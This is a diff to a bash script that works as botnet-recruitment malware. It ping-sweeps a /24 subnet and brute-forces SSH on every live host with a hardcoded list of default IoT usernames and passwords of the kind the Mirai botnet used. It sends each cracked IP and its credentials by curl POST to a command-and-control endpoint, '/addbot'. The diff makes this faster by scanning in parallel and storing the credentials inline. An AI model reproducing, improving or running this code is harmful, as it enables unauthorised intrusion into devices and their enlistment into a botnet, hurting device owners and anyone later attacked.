@@ -1,14 +1,10 @@
 #!/bin/bash
 
-source .config
-
-rm userPassIPFile.txt
-
+source ./.config
 
 val=""
-echo $destIP > temp.txt
-val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" temp.txt)
-ip=$(grep -ohE "([0-9]{1,3}\.){3}" temp.txt)
+val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" <<< $destIP)
+ip=$(grep -ohE "([0-9]{1,3}\.){3}" <<< $destIP)
 echo $ip
 if [[ $val == "" ]]
 then
@@ -17,14 +13,51 @@ then
         echo "this program handles only /24 subnet values"
 	exit
 else
-	echo "trying with $ip.0/24"
+	echo "trying with $ip 0/24"
 fi
+
+# brute force try to ssh into the machine main function
+sshTry()
+{
+	declare -a usernames=( "666666" "satya" "888888" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "pi" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "admin1" "administrator" "Administrator" "guest" "guest" "mother" "pi" "pi" "pi" "pi" "reddy" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "root" "service" "supervisor" "support" "tech" "ubnt" "user" "NA" )
+	declare -a passwords=( "666666" "satya" "888888" "" "1111" "1111111" "1234" "admin1234" "12345" "123456" "123456789" "54321" "7ujMko0admin" "admin" "meinsm" "pass" "password" "smcadmin" "password" "1234" "admin" "12345" "guest" "fucker" "root" "raspberry" "123456789" "" "admin1234" "" "00000000" "1111" "1234" "12345" "123456" "54321" "666666" "7ujMko0admin" "7ujMko0vizxv" "888888" "admin" "anko" "default" "dreambox" "hi3518" "ikwb" "juantech" "jvbzd" "klv123" "klv1234" "pass" "password" "realtek" "root" "system" "user" "vizxv" "xc3511" "xmhdipc" "zlxx." "Zte521" "service" "supervisor" "support" "tech" "ubnt" "user" "NA" )
+	
+	uname=""
+	pass=""
+
+	for i in {0..67};
+	do
+		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";return' INT
+		uname=${usernames[i]}
+		pass=${passwords[i]}
+		# echo "trying $uname and $pass."
+		sshpass -p "$pass" ssh -oStrictHostKeyChecking=no $uname@$1 "exit;" &>/dev/null
+		if [ $? -eq 0 ]
+		then
+			echo "Username : $uname Password : $pass"
+			break
+		fi
+	done 
+	val=$1,$uname,$pass
+	echo $val
+	if [[ $uname == "NA" ]]
+	then
+		echo "user name and password not found for $1"
+	else
+		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
+		echo "$val added"
+	fi
+}
 
 # Scan network helper
 is_alive_ping()
 {
 	ping -c 1 $1 > /dev/null
-	[ $? -eq 0 ] && echo $i
+	if [ $? -eq 0 ]
+	then
+		echo "Brute forcing the device with IP $1"
+		sshTry $1
+	fi
 }
 
 # scan network main 
@@ -32,96 +65,18 @@ nwscan()
 {
 	for i in $1{2..254}
 	do
-		is_alive_ping $i & disown
+		# is_alive_ping $i & disown
+		is_alive_ping $i &
 	done
 }
 
-
-# brute force try to ssh into the machine main function
-sshTry()
-{
-	INPUT=password.csv
-	OUTPUTFILE=userPassIPFile.txt
-	OLDIFS=$IFS
-	IFS=','
-	uname=""
-	pass=""
-
-	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
-	while read username password
-	do
-		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";return' INT
-		uname=$username
-		pass=$password
-		echo "trying $username and $password."
-		sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &>/dev/null
-		if [ $? -eq 0 ]
-		then
-			echo "Username : $username"
-			echo "Password : $password"
-			break
-		fi
-	done < $INPUT
-	IFS=$OLDIFS
-	val=$1,$uname,$pass
-	if [[ $uname == "NA" ]]
-	then
-		echo ""
-		echo "user name and password not found for $1"
-		echo ""
-		# exit 0
-	else
-		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
-		echo "$val" >>$OUTPUTFILE
-		echo "$val added"
-	fi
-}
-
-
-
 n=1
-k=1
 while (($n <=5 ))
 do
-	trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";exit 0' INT
-	echo ""
-	echo ""
-	echo "running the script for the $k th time"
-	echo ""
+	trap 'echo ""; echo"" ;echo "Terminated by the user"; echo"";echo "exiting this $1";exit 0' INT
 	echo ""
 	echo "Scanning the Network"
-
-	nwscan $ip > ips.txt
-	
-	echo ""
-	echo ""
-	echo "Devices on the network"
-	sleep 2
-	cat ips.txt
-
-	echo ""
-	echo ""
-	echo "SSH attempt"
-	echo ""
-
-	while IFS= read -r line; do
-		echo "Brute forcing the device with IP $line"
-		sshTry $line
-		echo ""
-		echo ""
-	done < ips.txt
-
-	echo "Completed!!"
-	sleep 1
-	echo "IP , User name , Passwords are"
-	
-	python3 command_helper.py
-	
-	k=($k + 1)
+	nwscan $ip
 	echo "about to retart in few seconds"
-	sleep 4
-	echo ""
-	echo ""
+	sleep 10
 done
-
-rm temp.txt
